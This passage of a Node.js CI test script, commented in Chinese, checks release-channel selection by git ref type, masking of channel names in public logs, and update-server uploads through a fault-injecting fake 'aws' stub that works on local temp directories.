#!/usr/bin/env node
/**
 * CI 渠道脚本的回归门禁。
 *
 * 为什么值得单独测:`scripts/ci-channels.sh` 与 `scripts/ci-package-clients.sh`
 * 决定**发哪些渠道、发到哪、以及渠道信息会不会进公开日志**。这三件事出错都是
 * 静默的(发错镜像 / 漏发渠道 / 客户名进了公开 Actions 日志),而且它们在
 * GitHub Actions 里才真正运行 —— 本地没有门禁就只能靠发版时踩。
 *
 * 覆盖:
 *   1. tag → 渠道集策略(正式 tag 全发、beta tag 只发 beta、非 tag 只发 official)
 *   2. 渠道枚举的掩码与定序(official 置顶)、不合规目录被跳过且**不打印名字**
 *   3. 缺 token / 渠道仓结构不符 / 缺 channel.json → fail-loud；渠道字段(品牌 +
 *      `desktop.app_origin_scheme`)的必填/形状/保留字/跨渠道唯一也在这里拦,
 *      且失败信息**只报字段名不回显取值**(取值就是客户品牌,输出进公开日志)
 *   4. 逐渠道打包:官方保留完整日志、渠道输出被抑制、失败只报中性信息
 *   5. 产物归集到 client-assets/<channel>/,没产出即失败
 *   6. 更新服务器(R2)发布:每渠道独立目录、清单内容、保留最近 3 版、
 *      缓存头(资产 immutable / 清单 no-cache)、清单最后写、缺 secrets 跳过、
 *      产物不全 fail-loud —— 这些出错都是静默的,只能在发版时才发现
 *
 * 用法:node scripts/verify-ci-scripts.mjs
 * 退出码:0 全部通过;1 有断言失败。
 */

import { execFileSync, spawnSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { crc32, deflateSync } from 'node:zlib'
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'

// 复用门禁自己的 run 块解析器:下面 1c 要**真跑** ci.yml 里的 shell 步骤(不是文本对拍)。
import { extractRunBlocks } from './check-workflows.mjs'
// step 级字段(`env:`)必须走 YAML 解析 —— 1d 的 W-8 判据问的是"这一步的 env 里有没有
// 那个变量",子串匹配会把别处(别的 job/别的 step)的同一行算进来。
import { parse as parseYaml } from 'yaml'

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const channelsScript = join(root, 'scripts', 'ci-channels.sh')
const releasePolicyScript = join(root, 'scripts', 'ci-release-policy.sh')
const packageScript = join(root, 'scripts', 'ci-package-clients.sh')
const publishScript = join(root, 'scripts', 'ci-publish-update-server.sh')
const transferScript = join(root, 'scripts', 'ci-channel-transfer.sh')
const imagesScript = join(root, 'scripts', 'ci-build-channel-images.sh')
const failures = []
const scratch = []

/**
 * 假 aws(给 ci-publish-update-server.sh 的本地回归用):把 s3 / s3api 子命令落到
 * 本地目录,并把每次调用记进日志,便于断言。
 *
 * 支持 `s3 cp` / `s3 ls` / `s3 rm`(保留策略路径)与发布脚本真正用到的
 * `s3api put-object` / `s3api head-object`(2026-09-23 审计 K-01 起,上传走单请求
 * PUT + 存储侧校验和 —— 假 aws 必须同形,否则"上传成功但对象损坏"这类场景在本地
 * 根本构造不出来)。
 *
 * 故障注入(通过**子进程环境变量**给,不用改脚本文本):
 *   FAKE_AWS_TRUNCATE_BYTES=N  put-object 只写前 N 字节(退出码仍为 0 —— 模拟
 *                              "上传成功但字节被截断"的现场形态)
 *   FAKE_AWS_SIZE=…            覆盖 head-object 报的 ContentLength
 *   FAKE_AWS_SHA=…             覆盖 head-object 报的 ChecksumSHA256('None' = 没有)
 *
 * **按对象作用域**(2026-09-23 第六轮审计 R6-C-3):上面三条缺省作用于**所有**对象
 * (K-01 的既有注入面,逐字不变);带上对应的 `<…>_KEY=<对象键子串>` 之后只作用于键含
 * 该子串的对象 —— 这是"换一个对象即静默"那类缺口的判据面:此前 A–E 五条用例全部打在
 * **先被校验的那个 zip** 上,于是 `SHA256SUMS` 与 `latest.json` 对象删掉校验之后门禁
 * 仍 EXIT=0(而成功行照旧宣称"上传后大小/哈希完整性校验")。
 *   FAKE_AWS_TRUNCATE_KEY=<子串>         只截断匹配的对象
 *   FAKE_AWS_SIZE_KEY / FAKE_AWS_SHA_KEY 只覆盖匹配对象的元数据
 *   FAKE_AWS_TRUNCATE_ON_HEAD=<子串>:<N> 第 N 次对匹配对象做 head-object **之后**把远端
 *                              对象截断到 10 字节(本次返回值仍是真的 —— 读在前)⇒ 只有
 *                              **之后**那次复检能看见它。用途:证明"写指针前的复检"
 *                              确实是拦住"指针指向损坏对象"的那条判据。
 */
function fakeAwsScript({ store, log }) {
  return `#!/usr/bin/env bash
set -euo pipefail
log="${log}"
store="${store}"
record() { printf '%s\\n' "$*" >> "$log"; }
args=()
while [ $# -gt 0 ]; do
  case "$1" in
    --endpoint-url) shift 2 ;;
    *) args+=("$1"); shift ;;
  esac
done
# 注入作用域:$1=对象键,$2=子串(空 = 对所有对象生效 ⇒ 旧注入面逐字不变)。
inject_scope() {
  [ -z "\${2:-}" ] && return 0
  case "$1" in *"\${2}"*) return 0 ;; *) return 1 ;; esac
}
cmd="\${args[0]:-} \${args[1]:-}"
case "$cmd" in
  "s3 cp")
    src="\${args[2]}"; dst="\${args[3]}"
    extra=("\${args[@]:4}")
    record "cp $src $dst \${extra[*]:-}"
    key="\${dst#s3://*/}"
    if [[ "$dst" == */ ]]; then
      # 目录目标:对象键 = 前缀 + 源文件名(与 aws s3 cp 语义一致)
      dest="$store/\${key}$(basename "$src")"
    else
      dest="$store/\${key}"
    fi
    mkdir -p "$(dirname "$dest")"
    cp "$src" "$dest"
    ;;
  "s3api put-object")
    key=""; body=""; sum=""
    i=2
    while [ "$i" -lt "\${#args[@]}" ]; do
      case "\${args[$i]}" in
        --key) key="\${args[$((i+1))]}"; i=$((i+2)) ;;
        --body) body="\${args[$((i+1))]}"; i=$((i+2)) ;;
        --checksum-sha256) sum="\${args[$((i+1))]}"; i=$((i+2)) ;;
        *) i=$((i+1)) ;;
      esac
    done
    body="\${body#fileb://}"
    # 全参数入日志:缓存头断言(max-age / no-cache)就是靠这一行。
    record "\${args[*]}"
    dest="$store/$key"
    mkdir -p "$(dirname "$dest")"
    if [ "\${FAKE_AWS_TRUNCATE_BYTES:-0}" -gt 0 ] && inject_scope "$key" "\${FAKE_AWS_TRUNCATE_KEY:-}"; then
      head -c "\${FAKE_AWS_TRUNCATE_BYTES}" "$body" > "$dest"
    else
      cp "$body" "$dest"
    fi
    printf '%s' "$sum" > "$dest.checksum"
    ;;
  "s3api head-object")
    key=""; query=""
    i=2
    while [ "$i" -lt "\${#args[@]}" ]; do
      case "\${args[$i]}" in
        --key) key="\${args[$((i+1))]}"; i=$((i+2)) ;;
        --query) query="\${args[$((i+1))]}"; i=$((i+2)) ;;
        *) i=$((i+1)) ;;
      esac
    done
    record "head-object $key $query"
    target="$store/$key"
    if [ ! -f "$target" ]; then
      echo "An error occurred (404) when calling the HeadObject operation: Not Found" >&2
      exit 254
    fi
    if [ "$query" = "ContentLength" ]; then
      if [ -n "\${FAKE_AWS_SIZE:-}" ] && inject_scope "$key" "\${FAKE_AWS_SIZE_KEY:-}"; then
        echo "\${FAKE_AWS_SIZE}"
      else
        stat -c%s "$target"
      fi
    else
      if [ -n "\${FAKE_AWS_SHA:-}" ] && inject_scope "$key" "\${FAKE_AWS_SHA_KEY:-}"; then
        echo "\${FAKE_AWS_SHA}"
      elif [ -f "$target.checksum" ]; then
        cat "$target.checksum"
      else
        echo "None"
      fi
    fi
    # "第 N 次 head 之后把对象弄坏":本次返回值仍是真的(读在前),下一次才看得见 ⇒
    # 只有**上传之后的那次复检**能拦住它。
    if [ -n "\${FAKE_AWS_TRUNCATE_ON_HEAD:-}" ]; then
      head_key="\${FAKE_AWS_TRUNCATE_ON_HEAD%%:*}"
      head_at="\${FAKE_AWS_TRUNCATE_ON_HEAD##*:}"
      if inject_scope "$key" "$head_key"; then
        head_n="$(cat "$store/.headcount" 2>/dev/null || printf '0')"
        head_n=$((head_n + 1))
        printf '%s' "$head_n" > "$store/.headcount"
        if [ "$head_n" -ge "$head_at" ]; then
          head -c 10 "$target" > "$target.truncated"
          mv "$target.truncated" "$target"
        fi
      fi
    fi
    ;;
  "s3 ls")
    prefix="\${args[2]}"
    key="\${prefix#s3://*/}"
    record "ls $prefix"
    # 与真实 aws 同语义:前缀命中**单个对象**时打印那一行,命中"目录"时逐个列目录,
    # 都没有时**退出码 0 且无输出**(所以断言必须查"有没有输出",不能查退出码)。
    if [ -f "$store/$key" ]; then
      echo "2026-01-01 00:00:00          1 $key"
    elif [ -d "$store/$key" ]; then ls -d "$store/$key"*/ 2>/dev/null | while read -r d; do echo "PRE $(basename "$d")/"; done; fi
    ;;
  "s3 rm")
    target="\${args[2]}"
    key="\${target#s3://*/}"
    record "rm $target"
    rm -rf "$store/$key"
    ;;
  *) record "other $*" ;;
esac
`
}

function fail(message) {
  failures.push(message)
  process.stderr.write(`verify-ci-scripts: ${message}\n`)
}

function check(condition, message) {
  if (!condition) fail(message)
  return condition
}

/** 造一个临时目录(进程退出时清理)。 */
function tempDir(prefix) {  const dir = mkdtempSync(join(tmpdir(), prefix))
  scratch.push(dir)
  return dir
}

/**
 * 合成 git 仓库的公共环境与包装(拓扑判据 1e 与渠道 pin 1g 共用)。
 *
 * 为什么显式给 user/date/`GIT_CONFIG_NOSYSTEM`:判据跑在宿主 git 上,宿主的
 * `~/.gitconfig`(签名、模板、hooksPath)或系统配置不得影响结论,墙钟也不得决定
 * tag 的 creatordate 顺序。
 */
const gitFixtureEnv = {
  ...process.env,
  GIT_AUTHOR_NAME: 'ci-fixture',
  GIT_AUTHOR_EMAIL: 'ci-fixture@example.com',
  GIT_COMMITTER_NAME: 'ci-fixture',
  GIT_COMMITTER_EMAIL: 'ci-fixture@example.com',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_TERMINAL_PROMPT: '0',
}
function fixtureGit(dir, args, env = {}) {
  return spawnSync(
    'git',
    ['-C', dir, '-c', 'user.name=ci-fixture', '-c', 'user.email=ci-fixture@example.com', '-c', 'commit.gpgsign=false', ...args],
    { encoding: 'utf8', env: { ...gitFixtureEnv, ...env } },
  )
}
function fixtureMustGit(dir, args, env = {}) {
  const result = fixtureGit(dir, args, env)
  if (result.status !== 0) throw new Error(`fixture git ${args.join(' ')} 失败: ${result.stderr}`)
  return (result.stdout ?? '').trim()
}
/** 合成仓库:一个提交一个文件;日期显式给定。 */
function fixtureRepo() {
  const dir = tempDir('ci-git-fixture-')
  fixtureMustGit(dir, ['init', '-q', '-b', 'master'])
  return dir
}
function fixtureCommit(dir, file, message, date) {
  const target = join(dir, file)
  mkdirSync(dirname(target), { recursive: true })
  writeFileSync(target, `${message}\n`)
  fixtureMustGit(dir, ['add', '-A'])
  fixtureMustGit(dir, ['commit', '-q', '-m', message], { GIT_AUTHOR_DATE: date, GIT_COMMITTER_DATE: date })
}
function fixtureTag(dir, name, date) {
  return fixtureMustGit(dir, ['tag', '-a', name, '-m', name], { GIT_COMMITTER_DATE: date, GIT_AUTHOR_DATE: date })
}

/** PNG 块(长度 + 类型 + 数据 + CRC)。 */
function pngChunk(type, data) {
  const length = Buffer.alloc(4)
  length.writeUInt32BE(data.length)
  const typeBuffer = Buffer.from(type, 'ascii')
  const crc = Buffer.alloc(4)
  crc.writeUInt32BE(crc32(Buffer.concat([typeBuffer, data])) >>> 0)
  return Buffer.concat([length, typeBuffer, data, crc])
}

/** 造一张最小 PNG(用于测构建期的图标几何校验,不引入 sharp 依赖)。 */
function tinyPng(width, height, bitDepth, colorType) {
  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(width, 0)
  ihdr.writeUInt32BE(height, 4)
  ihdr[8] = bitDepth
  ihdr[9] = colorType
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', deflateSync(Buffer.alloc(width * height * 4))),
    pngChunk('IEND', Buffer.alloc(0)),
  ])
}

/**
 * 找出 release job 里"用 tag 名形状判形态"的用法(必须为零)。
 *
 * 只认 `if:` 条件里的 `github.ref_name` 形状判断(`contains(...)` / `startsWith(...)`,
 * 含取反形态);`VERSION: ${{ github.ref_name }}`、`TAG="${GITHUB_REF_NAME}"` 这类
 * **取值**位是合法的 —— tag 名本来就要作为版本号传下去,一并禁掉会把正常写法打红
 * (2026-09-23 现场踩过:断言写成 `!job.includes('github.ref_name')`,把
 * `VERSION: ${{ github.ref_name }}` 也判成违规)。
 */
function tagShapePredicates(jobText) {
  const hits = []
  for (const [index, line] of jobText.split('\n').entries()) {
    if (!/^\s*(?:-\s*)?if:/u.test(line)) continue
    if (/(?:!\s*)?(?:contains|startsWith)\(\s*github\.ref_name/u.test(line)) {
      hits.push({ line: index + 1, text: line.trim() })
    }
  }
  return hits
}

/** 渠道 id 形状（与 ci-channels.sh 的 ID_PATTERN 同源）。 */
const CHANNEL_ID_PATTERN = /^[a-z0-9][a-z0-9-]{0,31}$/u

/**
 * `ci-channels.sh` 声明的渠道目录数下限（R8-C-7 的 identity-free 棘轮常量）。
 * 从脚本里读而不是在测试里写死：调高下限时夹具会自动跟着补齐，不会静默失配。
 */
function channelFloor() {
  const match = /^MIN_EXPECTED_CHANNELS=(\d+)$/mu.exec(readFileSync(channelsScript, 'utf8'))
  check(match !== null, 'ci-channels.sh 必须声明 MIN_EXPECTED_CHANNELS(渠道目录数下限,R8-C-7)')
  return match === null ? 0 : Number(match[1])
}

/** 渠道仓里**符合 id 形状**的目录名（与脚本的枚举口径一致：不合规目录不计入）。 */
function channelIdsOf(root) {
  const dir = join(root, 'channels')
  if (!existsSync(dir)) return []
  return readdirSync(dir, { withFileTypes: true })
    .filter(entry => entry.isDirectory() && CHANNEL_ID_PATTERN.test(entry.name))
    .map(entry => entry.name)
}

/** 脚本的定序规则：official 置顶，其余字典序。 */
function orderedChannelIds(root) {
  const ids = channelIdsOf(root)
  const rest = ids.filter(id => id !== 'official').sort()
  return ids.includes('official') ? ['official', ...rest] : rest
}

/**
 * 往渠道仓根目录补足到下限的"填充渠道"（中性名字、合法配置、scheme 互不相同）。
 *
 * 为什么每个"稳定 tag + 枚举渠道"的夹具都要补（R8-C-7）：真实渠道仓的目录数 ≥ 下限，
 * 而**正式 tag 上跌破下限 = 红**。不补的话，那些只想测"某个字段非法"的用例会先被下限
 * 拦住 —— 断言看似通过，测到的东西却与它声称的无关（本项目最贵的假绿形态）。
 * 返回补出来的 id 列表。
 */
function padChannelRepo(root, min = channelFloor()) {
  const existing = channelIdsOf(root)
  const added = []
  let index = 1
  while (existing.length + added.length < min) {
    const id = `filler-${index++}`
    if (existing.includes(id)) continue
    mkdirSync(join(root, 'channels', id), { recursive: true })
    writeFileSync(join(root, 'channels', id, 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: id,
      identity: { display_name: `${id} AI`, short_name: id },
      desktop: {
        product_name: `${id} AI`,
        slug: `${id}-AI`,
        app_id: `com.example.${id.replaceAll('-', '')}`,
        deep_link_scheme: `${id.replaceAll('-', '')}link`,
        home_dir: `.${id}-harness`,
        app_origin_scheme: `${id.replaceAll('-', '')}-app`,
      },
    }))
    added.push(id)
  }
  return added
}

/** 造一个假的私有渠道仓:`<root>/channels/<id>/channel.json`。 */
function fakeChannelRepo(ids, options = {}) {
  const dir = tempDir('ci-channels-repo-')
  for (const id of ids) {
    mkdirSync(join(dir, 'channels', id), { recursive: true })
    // 品牌字段是**必需**的(ci-channels.sh 里 fail-loud):客户端在登录之前就要
    // 显示品牌,包里没写就回落中性占位。品牌渠道的编译期字段(slug/app_id/
    // deep_link_scheme/home_dir)同样必需 —— 缺 slug 安装包名回落厂商品牌、缺
    // app_id 两个渠道的客户端在系统里变成同一个 app、缺 home_dir 两个渠道共用
    // 一个数据根(跨渠道共享登录态/会话)。
    //
    // desktop.app_origin_scheme(2026-09-19 §10)**全部渠道必填**(含 official/beta):
    // 夹具必须与之一体 —— 不给公共渠道写这个字段,加了必填校验后下面整组 tag→渠道集
    // 用例会一起变红(2026-09-12 home_dir 那次踩过同一个坑)。取值:公共渠道共用
    // `picoaide-app`(§16 W3:official/beta 是一个命名空间,跨渠道唯一性扫描对它们
    // 豁免),品牌渠道用 `<id 去连字符>-app`(合法形状、彼此不同、也不撞公共值)。
    const publicChannel = id === 'official' || id === 'beta'
    writeFileSync(join(dir, 'channels', id, 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: id,
      identity: { display_name: `${id} AI`, short_name: id },
      // 私有仓的渠道包里真实存在这样的注解字段:校验必须忽略 `_` 前缀的键,
      // 否则整条发布会被一条注释拦下(2026-09-10 CI 实测)。
      assets: { _note: '注解:渠道素材说明,不是文件名/路径' },
      ...(publicChannel
        ? // beta 必须显式声明**与官方正式版一致**的数据根（2026-09-12 用户定案）：
          // 预发版是正式版的前置验证，登录态/设置/会话要与正式版延续；写成自己的
          // 目录会让预发版用户升级后看不到既有会话（当天实测的"对话全没了"事故）。
          (id === 'beta'
            ? { desktop: { home_dir: '.picoaide-harness', app_origin_scheme: 'picoaide-app' } }
            : { desktop: { app_origin_scheme: 'picoaide-app' } })
        : {
            desktop: {
              product_name: `${id} AI`,
              slug: `${id}-AI`,
              app_id: `com.example.${id.replaceAll('-', '')}`,
              deep_link_scheme: `${id.replaceAll('-', '')}link`,
              home_dir: `.${id}-harness`,
              app_origin_scheme: `${id.replaceAll('-', '')}-app`,
            },
          }),
    }))
  }
  for (const extra of options.extraDirectories ?? []) {
    mkdirSync(join(dir, 'channels', extra), { recursive: true })
  }
  // 渠道目录数下限（R8-C-7）：真实渠道仓 ≥ 下限，夹具也必须在这个形状上跑（见 padChannelRepo）。
  if (options.pad !== false) padChannelRepo(dir)
  return dir
}

/**
 * 跑 ci-channels.sh。
 * @param options - `refName` 是 `GITHUB_REF_NAME`,`ref` 是 `GITHUB_REF`。
 *   缺省把 refName 当成 tag(`refs/tags/<refName>`)—— 多数用例测的是 tag 策略;
 *   分支用例显式传 `ref: 'refs/heads/…'`(`GITHUB_REF` 由 GitHub 注入,分支 push
 *   上就是 `refs/heads/<分支名>`)。
 *   `args` 是在 `--dest` / `--list` 之前追加的额外 argv(`--pin <sha>` / `--resolve-only`)。
 */
function runChannels({ source, refName = '', ref, dest, list, env = {}, args = [] }) {
  const cwd = tempDir('ci-channels-run-')
  const result = spawnSync('bash', [channelsScript, ...args, '--dest', dest, '--list', join(cwd, list)], {
    cwd,
    encoding: 'utf8',
    env: {
      PATH: process.env.PATH ?? '',
      HOME: process.env.HOME ?? '',
      ...(source === undefined ? {} : { CI_CHANNELS_SOURCE: source }),
      GITHUB_REF_NAME: refName,
      GITHUB_REF: ref ?? (refName === '' ? '' : `refs/tags/${refName}`),
      ...env,
    },
  })
  const listPath = join(cwd, list)
  return {
    status: result.status,
    stdout: result.stdout ?? '',
    stderr: result.stderr ?? '',
    selected: existsSync(listPath)
      ? readFileSync(listPath, 'utf8').split('\n').filter(line => line !== '')
      : [],
    listPath,
  }
}

// ---- 1. tag → 渠道集策略 ----
{
  const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'zeta'])
  const repoTag = runChannels({ source, refName: 'v2.7.0', dest: 'channels', list: 'a.list' })
  check(repoTag.status === 0, '正式 tag 应成功')
  check(
    JSON.stringify(repoTag.selected) === JSON.stringify(['official', 'beta', 'example-brand', 'zeta']),
    `正式 tag 应发全部渠道且 official 置顶,实际 ${JSON.stringify(repoTag.selected)}`,
  )

  const betaTag = runChannels({ source, refName: 'v2.7.0-beta.3', dest: 'channels', list: 'b.list' })
  check(
    JSON.stringify(betaTag.selected) === JSON.stringify(['beta']),
    `beta tag 应只发 beta,实际 ${JSON.stringify(betaTag.selected)}`,
  )

  const branch = runChannels({ source, refName: '', dest: 'channels', list: 'c.list' })
  check(
    JSON.stringify(branch.selected) === JSON.stringify(['official']),
    `非 tag 应只发 official,实际 ${JSON.stringify(branch.selected)}`,
  )

  // 渠道集必须按**真正的 ref 类型**判定,不能按名字形状(2026-09-12 审计 P1-1)。
  //
  // 为什么:分支 push 上 `GITHUB_REF_NAME` 等于**分支名**,而 `refs/heads/v2.7.2`
  // 这种分支名会被裸 glob `v[0-9]*.[0-9]*.[0-9]*` 当成正式 tag ⇒ 构建**全部**渠道;
  // 同一轮里把品牌产物搬出 `client-assets/` 的 transfer step 带 tag 守卫、分支上
  // 被跳过 ⇒ 客户品牌安装包进了**匿名可读**的公开 artifact(`ci.yml` 的 upload
  // 步骤当时没有守卫)。`GITHUB_REF` 的前缀是唯一无歧义的判据。
  const branchNamedLikeTag = runChannels({
    source, refName: 'v2.7.2', ref: 'refs/heads/v2.7.2', dest: 'channels', list: 'c2.list',
  })
  check(branchNamedLikeTag.status === 0, '名字像 tag 的分支仍应成功(回落 official,不是失败)')
  check(
    JSON.stringify(branchNamedLikeTag.selected) === JSON.stringify(['official']),
    `refs/heads/v2.7.2 是**分支**不是 tag,必须只发 official,实际 ${JSON.stringify(branchNamedLikeTag.selected)}`,
  )

  // `-beta` 后缀分支同理:按名字匹配会"只发 beta",官方包整轮缺失(artifact 名与
  // 内容不符,PR 评论仍宣称是常规产物)。
  const betaBranch = runChannels({
    source, refName: 'fix/login-beta', ref: 'refs/heads/fix/login-beta', dest: 'channels', list: 'c3.list',
  })
  check(
    JSON.stringify(betaBranch.selected) === JSON.stringify(['official']),
    `分支 fix/login-beta 不是 tag,必须只发 official,实际 ${JSON.stringify(betaBranch.selected)}`,
  )

  // 真 tag 判据不能只看"有没有 refs/"前缀:PR 的 `refs/pull/N/merge` 也不是 tag。
  const pullRequest = runChannels({
    source, refName: '42/merge', ref: 'refs/pull/42/merge', dest: 'channels', list: 'c4.list',
  })
  check(
    JSON.stringify(pullRequest.selected) === JSON.stringify(['official']),
    `refs/pull/42/merge 不是 tag,必须只发 official,实际 ${JSON.stringify(pullRequest.selected)}`,
  )

  // 缺 GITHUB_REF(本地直跑)时按**非 tag** 处理:安全缺省是"只发 official",
  // 绝不能因为"名字像 tag"就把品牌渠道发出去。
  const noRef = runChannels({ source, refName: 'v2.7.2', ref: '', dest: 'channels', list: 'c5.list' })
  check(
    JSON.stringify(noRef.selected) === JSON.stringify(['official']),
    `缺 GITHUB_REF 时必须按非 tag 处理(只发 official),实际 ${JSON.stringify(noRef.selected)}`,
  )

  // "名字像 tag 但 ref 不是 tag"必须给一条**中性**告警:这类输入几乎总是误操作
  // (把 tag 名当分支推了 / 从 tag 建了同名分支),静默会让"这轮少发渠道"很久以后
  // 才被发现。告警本身不得回显分支名或渠道名(渠道 CI 不输出渠道侧字符串)。
  {
    const warned = runChannels({
      source, refName: 'v2.7.2', ref: 'refs/heads/v2.7.2', dest: 'channels', list: 'c6.list',
    })
    check(warned.stderr.includes('::warning::') && warned.stderr.includes('refs/tags/'), '名字像 tag 的分支应给出中性告警')
    check(!warned.stderr.includes('v2.7.2'), '告警不得回显 ref 名(可能带客户信息)')
    check(!/\b(example-brand|zeta)\b/u.test(warned.stderr), '告警不得回显渠道 id')
    check(warned.stdout.includes('::add-mask::'), '渠道 id 仍须逐个 add-mask')

    // 普通的 PR/分支(名字不像 tag)不该被这条告警刷屏。
    const quiet = runChannels({
      source, refName: 'fix/login-header', ref: 'refs/heads/fix/login-header', dest: 'channels', list: 'c7.list',
    })
    check(!quiet.stderr.includes('::warning::'), '名字不像 tag 的分支不应产生该告警')
    // 真 tag 上同样不该有这条告警(REF_NAME 没被清空)。
    const tagged = runChannels({ source, refName: 'v2.7.0', ref: 'refs/tags/v2.7.0', dest: 'channels', list: 'c8.list' })
    check(!tagged.stderr.includes('::warning::'), 'tag 上不应产生该告警')
    check(
      JSON.stringify(tagged.selected) === JSON.stringify(['official', 'beta', 'example-brand', 'zeta']),
      `真 tag 仍须发全部渠道,实际 ${JSON.stringify(tagged.selected)}`,
    )
  }
}

// ---- 1b. `ref 形态 → 渠道集 / 是否发布` 的唯一真源(2026-09-23 审计 K-04) ----
//
// 这条规则曾经有两份实现:`ci-channels.sh` 的 bash glob 与 `ci.yml` 里 release job 的
// `if:` 表达式。两者对"名字带 `-` 但后缀不认识"的 tag 结论**相反** —— 一个
// `v2.8.2-hotfix`(合法 semver,`scripts/version.mjs check` 也放行)会被渠道脚本按
// `v[0-9]*.[0-9]*.[0-9]*` 前缀当成正式版 ⇒ 构建**全部**渠道(含品牌渠道);而 release
// job 的兜底是 `!contains(ref_name,'-')` ⇒ 整个 release job 被跳过。结果:40 分钟全渠道
// 构建 + **零交付**(GitHub Release 与 R2 都没有新版本、客户侧零信号),品牌产物还留在
// R2 中转前缀里没人清理(销毁步骤在 release job 内部)。
//
// 现在判定只有 `scripts/ci-release-policy.sh` 一份:gate 第一步执行它(未知形态当场红,
// 下游 job 因 needs 全部跳过)、ci-channels.sh 与 release job 都读它。这一组同时做
// **行为表**与**静态对拍**(后者防的是"改一处、留一处"的老毛病复发)。
{
  const policy = (ref, refName) => spawnSync(
    'bash', [releasePolicyScript, '--ref', ref, '--ref-name', refName],
    { encoding: 'utf8' },
  )
  const fields = stdout => Object.fromEntries(
    stdout.split('\n').filter(Boolean).map(line => [line.slice(0, line.indexOf('=')), line.slice(line.indexOf('=') + 1)]),
  )

  const table = [
    { ref: 'refs/tags/v2.8.1', name: 'v2.8.1', kind: 'stable', channels: 'all', publish: 'true' },
    { ref: 'refs/tags/v2.8.0-beta.2', name: 'v2.8.0-beta.2', kind: 'prerelease', channels: 'beta', publish: 'true' },
    { ref: 'refs/tags/v2.8.0-rc', name: 'v2.8.0-rc', kind: 'prerelease', channels: 'beta', publish: 'true' },
    { ref: 'refs/tags/v2.8.0-alpha.1', name: 'v2.8.0-alpha.1', kind: 'prerelease', channels: 'beta', publish: 'true' },
    // 非 tag(分支/PR/缺 ref)→ 只 official、不发布(`GITHUB_REF` 的类型前缀是唯一判据)
    { ref: 'refs/heads/v2.8.1', name: 'v2.8.1', kind: 'none', channels: 'official', publish: 'false' },
    { ref: 'refs/pull/42/merge', name: '42/merge', kind: 'none', channels: 'official', publish: 'false' },
    { ref: 'refs/tags/docs-snapshot', name: 'docs-snapshot', kind: 'none', channels: 'official', publish: 'false' },
    { ref: '', name: '', kind: 'none', channels: 'official', publish: 'false' },
  ]
  for (const row of table) {
    const result = policy(row.ref, row.name)
    if (!check(result.status === 0, `策略脚本对 ${row.ref || '<空 ref>'} 应成功,实际 ${String(result.status)}: ${result.stderr ?? ''}`)) continue
    const parsed = fields(result.stdout ?? '')
    check(parsed.release_kind === row.kind, `${row.ref}: release_kind 应为 ${row.kind},实际 ${parsed.release_kind}`)
    check(parsed.channel_set === row.channels, `${row.ref}: channel_set 应为 ${row.channels},实际 ${parsed.channel_set}`)
    check(parsed.publish_release === row.publish, `${row.ref}: publish_release 应为 ${row.publish},实际 ${parsed.publish_release}`)
  }

  // "名字像发布 tag 但形态不认识"必须**当场中止**:不允许"一边全渠道构建、一边不发布"。
  for (const name of ['v2.8.2-hotfix', 'v2.8.2-preview', 'v2.8', 'v2.8.2.1', 'v26081402']) {
    const result = policy(`refs/tags/${name}`, name)
    check(result.status !== 0, `未知后缀的 tag(${name})必须 fail-loud,不能猜一个渠道集`)
    check(
      `${result.stderr ?? ''}${result.stdout ?? ''}`.includes('形态'),
      `未知后缀的失败信息应点名"形态"(便于当场改 tag),实际: ${(result.stderr ?? '').slice(0, 160)}`,
    )
    // 公开日志纪律:失败信息不回显 tag 名(tag 名可能带渠道/客户信息)。
    check(!`${result.stderr ?? ''}${result.stdout ?? ''}`.includes(name), 'tag 形态失败信息不得回显 tag 名')
  }

  // 同一条 tag 形态,渠道脚本与策略脚本必须给**同一个**渠道集(这是"两份实现"的正面判据)。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand'])
    for (const name of ['v2.8.1', 'v2.8.0-beta.2']) {
      const expected = fields(policy(`refs/tags/${name}`, name).stdout ?? '').channel_set
      const result = runChannels({ source, refName: name, dest: 'channels', list: 'p.list' })
      check(result.status === 0, `${name}: 渠道发现应成功`)
      // `all` 的期望值按**实际目录集**算（夹具含 R8-C-7 的下限补位渠道），
      // 否则这条断言钉住的是夹具的巧合而不是"脚本与策略同源"。
      const expectedSelected = expected === 'all'
        ? orderedChannelIds(source)
        : expected === 'beta' ? ['beta'] : ['official']
      check(
        JSON.stringify(result.selected) === JSON.stringify(expectedSelected),
        `${name}: 渠道脚本与策略脚本必须给出同一渠道集(策略=${expected},实际 ${JSON.stringify(result.selected)})`,
      )
    }
    // 未知后缀:渠道脚本也必须 fail-loud(而不是按最宽的 glob 全渠道构建)。
    const hotfix = runChannels({ source, refName: 'v2.8.2-hotfix', dest: 'channels', list: 'p2.list' })
    check(hotfix.status !== 0, '未知后缀 tag 在渠道发现步骤就必须失败(否则会全渠道构建却零发布)')
    check(!existsSync(hotfix.listPath), '失败时不得写出渠道列表(下游步骤拿到它就会继续构建)')
  }

  // 漏 `v` 前缀的版本号 tag 必须 fail-loud(2026-09-23 第五轮审计 R5-C-1)。
  //
  // 现场:`2.8.2-beta.1` 既不匹配 stable 也不匹配 prerelease,而旧 `looks_like` 只认
  // `v[0-9]*` ⇒ release_kind=none / publish=false / channel_set=official,release job 的
  // `if: refs/tags/v` 也不成立 ⇒ **三平台照常构建 40 分钟、GitHub Release 与 R2 全为零,
  // 而 CI 全绿**。K-04 消灭的"构建一半、发布零"只是换了个触发器。
  for (const name of ['2.8.2-beta.1', '2.8.2', '2.8.2-rc.1', 'release-2.8.2', 'harness-2.8.2']) {
    const result = policy(`refs/tags/${name}`, name)
    check(result.status !== 0, `漏 v / 含版本号的 tag(${name})必须 fail-loud,不能静默按"非发布"处理`)
    const text = `${result.stderr ?? ''}${result.stdout ?? ''}`
